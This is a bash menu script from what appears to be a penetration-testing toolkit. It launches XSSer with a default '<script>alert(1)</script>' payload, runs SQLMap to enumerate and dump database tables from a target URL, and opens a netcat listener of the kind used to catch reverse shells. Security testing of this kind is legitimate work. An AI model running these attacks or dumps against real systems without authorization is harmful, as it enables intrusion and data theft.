#!/bin/bash

source "menus/utils/colors.sh"
source "menus/utils/state.sh"
source "menus/utils/helper_functions.sh"

# ─────────────────────────────
# Menu options
# ─────────────────────────────
options=(
  "Set / Show Target URL"
  "XSSer"
  "SQLMap"
  "netcat Listener"
  "Back"
)

method=""
payload="<script>alert(1)</script>"

get_method(){
  # check for method
  read -e -p "Enter HTTP method to use (GET/POST) [${method:-GET}]: " input
  # If user pressed Enter, keep previous; otherwise update
  # default to GET if not Set
  if [[ -n $input ]]; then
    method=$input
  elif [[ -z $method ]]; then
    method="GET"
  fi
}

xsser_get(){
  t=$(get_url_var)
  echo "here"
  read -e -p "Enter the parameter to test for XSS (The Parameter Value must be 'XSS'): " input
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input ]]; then
    param=$input
  fi
  # set the param Value to XSS
  t=$(echo $t | sed -E "s/(${param}=)[^&]*/\1XSS/")
  # run xsser with auto option
  select choice in "Use automatic payloads" "Use specific payload"; do
    case $choice in
      "Use automatic payloads")
        echo -e "$YELLOW[*] Starting XSSer on $t...$WHITE"
        xsser --url $t --auto
        echo -e "$YELLOW[*] Completed XSSer on $t.$WHITE"
        break
        ;;
      "Use specific payload")
        echo -e "$YELLOW[*] Starting XSSer on $t with specific payload...$WHITE"
        read -e -p "Enter the XSS payload to use [${payload}]: " input_payload
        # If user pressed Enter, keep previous; otherwise update
        if [[ -n $input_payload ]]; then
          payload=$input_payload
        fi
        xsser --url $t -p $param --Fp "$payload"
        echo -e "$YELLOW[*] Completed XSSer on $t.$WHITE"
        break
        ;;
      *)
        echo -e "$RED Invalid Input. $WHITE"
        ;;
    esac
  done
}

xsser_post() {
  t=$(get_url_var)
  read -e -p "Enter the parameter to test for XSS (The Parameter Value must be 'XSS'): " input
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input ]]; then
    param=$input
  fi
  select choice in "Use automatic payloads" "Use specific payload"; do
    case $choice in
      "Use automatic payloads")
        echo -e "$YELLOW[*] Starting XSSer on $t...$WHITE"
        xsser --url $t --auto
        echo -e "$YELLOW[*] Completed XSSer on $t.$WHITE"
        break
        ;;
      "Use specific payload")
        echo -e "$YELLOW[*] Starting XSSer on $t with specific payload...$WHITE"
        read -e -p "Enter the XSS payload to use [${payload}]: " input_payload
        # If user pressed Enter, keep previous; otherwise update
        if [[ -n $input_payload ]]; then
          payload=$input_payload
        fi
        xsser --url $t -p $param --Fp "$payload" --method POST
        echo -e "$YELLOW[*] Completed XSSer on $t.$WHITE"
        break
        ;;
      *)
        echo -e "$RED Invalid Input. $WHITE"
        ;;
    esac
  done
}

xsser_tool(){
  require_tool xsser || return
  get_method
  if [[ "$method" == "GET" ]]; then
    xsser_get
  else
    xsser_post
  fi
}

sqlmap_list_dbs(){
  t=$(get_url_var)
  echo -e "$YELLOW[*] Starting SQLMap on $url...$WHITE"
  sqlmap -u $t --batch --dbs
}

sqlmap_list_tables(){
  t=$(get_url_var)
  echo -e "$YELLOW[*] Starting SQLMap on $url...$WHITE"
  read -e -p "Enter the database name to enumerate tables [${dbname:-none}]: " input_db
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_db ]]; then
    dbname=$input_db
  fi
  sqlmap -u $t --batch -D $dbname --tables
}

sqlmap_list_table_dump(){
  t=$(get_url_var)
  echo -e "$YELLOW[*] Starting SQLMap on $url...$WHITE"
  read -e -p "Enter the database name to enumerate tables [${dbname:-none}]: " input_db
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_db ]]; then
    dbname=$input_db
  fi
  read -e -p "Enter the table name to dump data from [${tablename:-none}]: " input_table
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input_table ]]; then
    tablename=$input_table
  fi
  sqlmap -u $t --batch -D $dbname -T $tablename --dump
}

sqlmap_tool(){
  require_tool sqlmap || return
  select choice in "List Databases" "List Tables" "Dump Table Data"; do
    case $choice in
      "List Databases")
        sqlmap_list_dbs
        break
        ;;
      "List Tables")
        sqlmap_list_tables
        break
        ;;
      "Dump Table Data")
        sqlmap_list_table_dump
        break
        ;;
      *)
        echo -e "$RED Invalid Input. $WHITE"
        ;;
    esac
  done
}

netcat_listener(){
  echo -e $CYAN 
  read -e -p "Enter the port to listen on [${port:-4444}]: " input
  echo -e $WHITE
  # If user pressed Enter, keep previous; otherwise update
  if [[ -n $input ]]; then
    port=$input
  else
    port=4444
  fi
  echo -e "$YELLOW[*] Starting netcat listener on port $port...$WHITE"
  nc -lvnp $port
}

while true; do
  clear
  logo
  printf "%b=== Exploitation Tools ===%b\n" "$VIO" "$WHITE"
  PS3="Choose an option: ";export PS3;
  select option in "${options[@]}"
  do 
    case $option in
      'Set / Show Target URL')
        set_url
        break
        ;;
      'XSSer')
        xsser_tool
        break
        ;;
      'SQLMap')
        sqlmap_tool
        break
        ;;
      'netcat Listener')
        netcat_listener
        break
        ;;
      Back)
        exit 0
        ;;
      *)
        echo -e "$RED Invalid Input. $WHITE"
        break
        ;;
    esac
  done
  pause
done
